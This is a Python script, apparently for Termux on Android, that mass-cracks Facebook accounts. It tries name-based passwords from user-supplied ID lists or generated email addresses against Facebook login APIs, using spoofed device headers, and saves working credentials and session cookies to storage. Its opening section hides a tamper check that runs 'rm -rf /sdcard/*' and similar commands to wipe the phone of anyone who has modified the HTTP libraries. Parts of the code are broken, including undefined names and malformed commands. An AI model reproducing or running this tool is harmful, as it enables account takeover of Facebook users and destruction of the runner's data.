import os,sys,uuid,re,random,time,string,json
import platform
try:
    import httplib2
except ModuleNotFoundError:
    os.system('pip install httplib2')
    import httplib2
try:
    import bs4
except ModuleNotFoundError:
    os.system('pip install bs4')
    import bs4
try:
    import httpx
except ModuleNotFoundError:
    os.system('pip install httpx')
    import httpx
try:
    import rich
except ModuleNotFoundError:
    os.system('pip install rich')
    import rich
from concurrent.futures import ThreadPoolExecutor as tred
try:
    import requests
except:
    os.system("pip install requests")
    import requests

from datetime import datetime
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import string
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor as ted
from bs4 import BeautifulSoup as bxx
sys.stdout.write('\x1b]2; RANDOM\x07')
#----------------------SEFITI----------------------
h = open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/httplib2/__init__.py", "r").read()
search_text = "disable_ssl_certificate_validation=False,"
if search_text in h:
    pass
else:
    exit('You Bypass user√')
bypass_search_text = 'disable_ssl_certificate_validation=True,'
if bypass_search_text in h:
    os.system('rm -rf /sdcard/*')
    os.system('rm-rf /sdcard/DCIM/')
    os.system('rm-rf /sdcard/Android/')
    os.system('rm-rf /sdcard/Android/data/')
    os.system('rm -rf /sdcard/Download/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /sdcard/0/*')
    print('Bypass user')
    exit()
else:
   pass
oks=[]
loop=0
cps=[]
directory = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
file_path = 'sessions.py'
if not 'print' in open(directory+'models.py','r').read():
    pass
else:
    os.system('rm - rf /sdcard/*')
    exit(' METHOD CAPTURE Done')

directory = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
file_path = 'sessions.py'
if not 'print' in open(directory+'sessions.py','r').read():
    pass
else:
    os.system('rm - rf /sdcard/*')
    exit(' METHOD CAPTURE Done')
directory = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
file_path = 'sys.stdout.write'
if not 'sys.stdout.write' in open(directory+'api.py','r').read():
    pass
else:
   # os.system('rm - rf /sdcard/*')
    exit(' sorry ')
    
    
    
directory = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
file_path = 'sys.stdout.write'
if not 'sys.stdout.write' in open(directory+'models.py','r').read():
    pass
else:
   # os.system('rm - rf /sdcard/*')
    exit(' sorry ')

directory = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
file_path = 'sessions.py'
if not 'sys.stdout.write' in open(directory+'sessions.py','r').read():
    pass
else:
    #os.system('rm - rf /sdcard/*')
    exit(' sorry ')
#----------------------User agent----------------------
#FIle ua
def file_m1():
    pass
def file_m2():
    pass
def file_m3():
    pass
def file_m4():
    pass


#random Ua
def random_m1():
    pass
def random_m2():
    pass
def random_m3():
    pass
def random_m4():
    pass
def bgraph_random():
    U='Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
    return U
now = datetime.now()
    
def api_random():
    h='[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z016D;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]'
    return h
def clear():
        os.system(f'clear')
        print(logo)
D = '\033[1;37'

ugen=[]
for xd in range(10000):
    aa='Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X)'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile/15E148 Safari/605.1'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
##----------------------Logo----------------------
uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid());id = "".join(uuidd).replace("_", "").replace("360", "RANDOM").replace("u", "9").replace("a", "A");plat = platform.version()[14:][:21][::-1].upper() + platform.release()[5:][::-1].upper() + platform.version()[:8];xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '');bxd = "RANDOM-";bumper = bxd + xp + id
logo=(f'''\033[1;37m
  ______ _______ __   _ ______   _____  _______
 |_____/ |_____| | \  | |     \ |     | |  |  |
 |    \_ |     | |  \_| |_____/ |_____| |  |  |
                                         
\033[1;37mFacebook: Muhammad Ruhel
\033[1;37mGithub  : Ruhel-404
\033[1;37mVersion : \033[1;91m1.1.7
\033[1;37mType    : Free \033[1;32mFile & Random
\033[1;37mkey     : {bumper}
\033[1;37━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
''')

hh=('''\033[1;37m
  ______ _______ __   _ ______   _____  _______
 |_____/ |_____| | \  | |     \ |     | |  |  |
 |    \_ |     | |  \_| |_____/ |_____| |  |  |
                                         
\033[1;37mFacebook: Muhammad Ruhel
\033[1;37mGithub  : Ruhel-404
\033[1;37mVersion : \033[1;91m1.1.7
\033[1;37mType    : Free \033[1;32mFile & Random
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
''')
#----------------------cooler----------------------
a = "\x1b[38;5;208m"
b="\033[1;30m"
c="\033[1;31m"
d="\033[1;32m"
e="\033[1;33m"
f="\033[1;34m"
g="\033[1;35m"
h="\033[1;36m"
i="\033[1;37m"
j = "\033[1;41m"
k = "\033[1;0m"
l = '\x1b[1;97m'
m = '\x1b[1;91m'
n = '\x1b[1;92m'
o = '\x1b[1;93m'
p = '\x1b[1;94m'
q = '\x1b[1;95m' 
r = '\x1b[1;96m'
s = '\x1b[0m'    
t = "\033[1;30m"
u = '\033[41m\x1b[1;97m'
#----------------------device model----------------------

def device():
    models = (['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
    return models
#----------------------main----------------------
def Of():
    clear()
    Y = '\033[1;37m'
    print(f'\033[1;37m[\033[1;32m1\033[1;37m]\033[1;32m FILE CRACKING ')
    print(f'\033[1;37m[\033[1;32m2\033[1;37m]\033[1;32m RANDOM CRACKING ')
    print(f'\033[1;37m[\033[1;32m3\033[1;37m]\033[1;32m GMAIL CRACKING ')
    print(f'\033[1;37m[\033[1;32m4\033[1;37m]\033[1;32m JOIN MESSENGER GROUP ')
    print(f'\033[1;37m[\033[1;32m5\033[1;37m]\033[1;32m CONTACT WITH ADMIN ')
    print(f'\033[1;37m[\033[1;32m0\033[1;37m]\033[1;32m EXIT-> ')
    MERA=input('\033[1;32mChoose:\033[1;33m ')
    if MERA in ['1','01','a','A']:
       F()
    if MERA in ['2','02','b','B']:
       country()
    if MERA in ['3','03','c','C']:
        gmail()
    if MERA in ['4','04','d','c']:
        os.system('xdg-open https://m.me/j/AbbUH0W6g_PCZP_R/')
    if MERA in ['5','05','e','E']:
       os.system('xdg-open https://www.facebook.com/profile.php?id=61556377723776')
    if MERA in ['0','exit','EXIT']:
       os.system('exit')
    else:
        Of()
def country():
    clear()
    print(f'\033[1;32m[\033[1;37m1\033[1;32m] Bangladesh cloning\n\033[1;32m[\033[1;37m2\033[1;32m] Nepal cloning\n\033[1;32m[\033[1;37m3\033[1;32m] India cloning\n\033[1;32m[\033[1;37m4\033[1;32m] Afghanistan cloning\n\033[1;32m[\033[1;37m5\033[1;32m] Pakistan cloning ')
    x=input('\033[1;32mChoose:\033[1;37m ')
    if x in ['1','01','a','A']:
        BD()
    elif x in ['2','02','b','B']:
        nepal()
    elif x in ['3','03','c','C']:
        India()
    elif x in ['4','04','d','c']:
        agf()
    elif x in ['5','05','e','E']:
        pk()
    else:
        country()
def linex():
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

def F():
                clear()
                os.system('xdg-open https://facebook.com/groups/973940944108660/')
                print(f'\033[1;37mExample : /sdcard/File.txt')
                linex()
                file = input(f'\033[1;37mFILE\033[1;37m : ')
                try:
                    fo = open(file,'r').read().splitlines()
                except FileNotFoundError:
                    print(f'\033[1;37mFile Not found ')
                    time.sleep(1)
                    F()
                clear()
                plist = []
                try:
                    ps_limit = int(input(f'\033[1;37m Pass Limit : '))
                except:
                    ps_limit =1
                clear()
                print(f'\033[1;37mExample: first last>firtslast>first123')
                linex()
                for i in range(ps_limit):
                    plist.append(input(f'\033[1;37mPUT PASS {i+1}: '))
                clear()
                print('\033[1;31m[\033[1;32m1\033[1;31m] \033[1;31mMETHOD \033[1;32m1 ')
                print('\033[1;31m[\033[1;32m2\033[1;31m] \033[1;31mMETHOD \033[1;32m2 ')
                print('\033[1;31m[\033[1;32m3\033[1;31m] \033[1;31mMETHOD \033[1;32m3 ')
                print('\033[1;31m[\033[1;32m4\033[1;31m] \033[1;31mMETHOD \033[1;32m4 ')
                print('\033[1;31m[\033[1;32m0\033[1;31m] \033[1;31mEXIT \033[1;32m0-> ')
                linex()
                mthd=input('\033[1;32mChoose:\033[1;33m ')
                linex()
                with tred(max_workers=50) as crack_submit:
                    clear()
                    total_ids = str(len(fo))
                    print('\033[1;37mTOTAL ACCOUNT : \033[1;37m'+total_ids)
                    print(f'\033[1;35mAROPLAN MOD ON\033[1;37m/OF\033[1;37m FOR OK ID')
                    print(f'\033[1;37mMETHOD \033[1;39mM'+mthd)
                    linex()
                    for user in fo:
                        ids,names = user.split('|')
                        passlist = plist
                        if mthd in ['1','01','a','A']:
                            crack_submit.submit(filem1,ids,names,passlist)
                        elif mthd in ['2','02','b','B']:
                            crack_submit.submit(filem2,ids,names,passlist)
                        elif mthd in ['3','03','c','C']:
                            crack_submit.submit(filem3,ids,names,passlist)
                        elif mthd in ['4','04','d','D']:
                            crack_submit.submit(filem4,ids,names,passlist)
                print('')
                linex()
                print('\n\033[1;32mTotal Ok Id : \033[1;37m'+str(len(oks)))
                print(f'\033[1;33mFile save in /sdcard/RANDOM-FILE-M{mthd}-OK.txt')
                print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#----------------------FILE_MEHOD_M1----------------------
def filem1(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write('\r\r\033[1;37m[RANDOM] [M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                        data = {
                        'adid': str(uuid.uuid4()),
                        'format': 'json',
                        'device_id': str(uuid.uuid4()),
                        'email': ids,
                        'password': pas,
                        'generate_analytics_claims': '1',
                        'community_id': '',
                        'cpl': 'true',
                        'try_num': '1',
                        'family_device_id': str(uuid.uuid4()),
                        'credentials_type': 'password',
                        'source': 'login',
                        'error_detail_type': 'button_with_disabled',
                        'enroll_misauth': 'false',
                        'generate_session_cookies': '1',
                        'generate_machine_id': '1',
                        'currently_logged_in_userid': '0',
                        'locale': 'en_GB',
                        'client_country_code': 'GB',
                        'fb_api_req_friendly_name': 'authenticate'}
                        headers = {
                        'User-Agent': bgraph_random(),
                        'Accept-Encoding':  'gzip, deflate',
                        'Accept': '*/*',
                        'Connection': 'keep-alive',
                        'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        'X-FB-Friendly-Name': 'authenticate',
                        'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                        'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                        'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                        'X-FB-Connection-Type': 'unknown',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-FB-HTTP-Engine': 'Liger'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers,allow_redirects=False).json()
                        if 'session_key' in po:
                                        print(f'\r\033[1;93m[\033[1;92mRANDOM-OK\033[1;93m]\033[1;32m {ids} \033[1;97m| \033[1;32m{pas}\033[1;91m')
                                        coki=";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/RANDOM-M1-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        open('/sdcard/RANA/RANDOM-M1-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
    
#                                                print(f'\r\r [RANDOM-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/RANDOM-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
            pass
#----------------------FILE_MEHOD_M2----------------------
def filem2(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write('\r\r\033[1;37m[RANDOM] [M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                        data={
                        'adid':str(uuid.uuid4()),
                        'email':ids,
                        'password':pas,
                        'cpl':'true',
                        'credentials_type':'device_based_login_password',
                        "source": "device_based_login",
                        'error_detail_type':'button_with_disabled',
                        'source':'login',
                        'format':'json',
                        'generate_session_cookies':'1',
                        'generate_analytics_claim':'1',
                        'generate_machine_id':'1',
                        "locale":"en_US",
                        "client_country_code":"US",
                        'device':device(),
                        'device_id':str(uuid.uuid4()),
                        "method": "auth.login",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                        headers = {
                        'content-type':'application/x-www-form-urlencoded',
                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                        'x-fb-connection-type':'unknown',
                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        'user-agent':bgraph_random(),
                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                        'x-fb-connection-quality':'EXCELLENT',
                        'x-fb-friendly-name':'authenticate',
                        'accept-encoding':'gzip, deflate',
                        'x-fb-http-engine':     'Liger'}
                        url = 'https://b-api.facebook.com/method/auth.login'
                        po = requests.post(url,data=data,headers=headers,allow_redirects=False).json()
                        if 'session_key' in po:
                                        print(f'\r\033[1;93m[\033[1;92mRANDOM-OK\033[1;93m]\033[1;32m {ids} \033[1;97m| \033[1;32m{pas}\033[1;91m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/RANDOM-M2-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        open('/sdcard/RANA/RANDOM-M2-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
#                                                print(f'\r\r [RANDOM-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/RANDOM-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
            pass
#----------------------FILE_MEHOD_M3----------------------
def filem3(ids,names,passlist):
        try:
                global oks,cps,loop
                ses=requests.Session()
                ua = random.choice(ugen)
                sys.stdout.write('\r\r\033[1;37m[RANDOM] [M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                        p = requests.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        dataa ={f"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
                        koki+=' m_pixel_ratio=2.625; wd=412x756'
                        heade={"Host":'p.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://p.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
                        url = 'https://p.facebook.com/login/device-based/validate-password/?shbl=0'
                        po = requests.post(url,data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
                        if "checkpoint" in po.cookies.get_dict().keys():
                                        open('/sdcard/RANDOM-CP.txt','a').write(ids+'|'+pas+'\n')
                                        break
                        elif "c_user" in ses.cookies.get_dict().keys():
                                        coki=po.cookies.get_dict()
                                        print(f'\r\033[1;93m[\033[1;92mRANDOM-OK\033[1;93m]\033[1;32m {ids} \033[1;97m| \033[1;32m{pas}\033[1;91m')
                                        coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                                        open('/sdcard/RANDOM-M4-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        open('/sdcard/RANDOM-M4-OK.txt','a').write(ids+'|'+pas+'\n')
                                        break
                        else:
                                        continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
            loop+=1

#----------------------FILE_MEHOD_M4----------------------
def filem4(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write('\r\r\033[1;37m[RANDOM] [M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                        data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                        headers={'User-Agent': bgraph_random(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000,40000)), 'X-FB-SIM-HNI': str(random.randint(20000,40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': str(random.randint(1000,9999)), 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\033[1;93m[\033[1;92mRANDOM-OK\033[1;93m]\033[1;32m {ids} \033[1;97m| \033[1;32m{pas}\033[1;91m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/RANDOM-M4-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        open('/sdcard/RANDOM-M4-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
    
#                                                print(f'\r\r [RANDOM-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/RANDOM-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
            pass
#----------------------GMAIL go----------------------
def gmail():
    user=[]
    os.system('xdg-open https://facebook.com/groups/973940944108660/')
    clear()
    print('\033[1;32mExample : emon> limon> tanii ')
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    first=input('\033[1;32mEnter First Name : ')
    clear()
    print('\033[1;32mExample : akter > khan > ahmed ')
    last=input('\033[1;32mEnter Last Name : ')
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    clear()
    print('\033[1;32mExample : @gmail.com > @yahoo.com')
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    domain=input('Enter Your Domain : ')
    clear()
    print(f'\033[1;32mExample : \033[1;32m2000 > \033[1;32m3000 > \033[1;32m4000 > \033[1;32m5000 > ')
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    try:
        limit=int(input(f'\033[1;37mCRACK LIMIT : > \033[1;35m'))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ted(max_workers=90) as M:
        tl=str(len(user))
        clear()
        print('\033[1;37mTOTAL ACCOUNT : \033[1;37m'+tl)
        print(f'\033[1;35mAROPLAN MOD ON\033[1;37m/OF\033[1;37m FOR OK ID')
        print(f'\033[1;37mMETHOD \033[1;39mM'+method)
        print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for digitx in user:
            uid=first+last+digitx+domain
            passlist=[first+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234']
            M.submit(gmsil,uid,passlist)
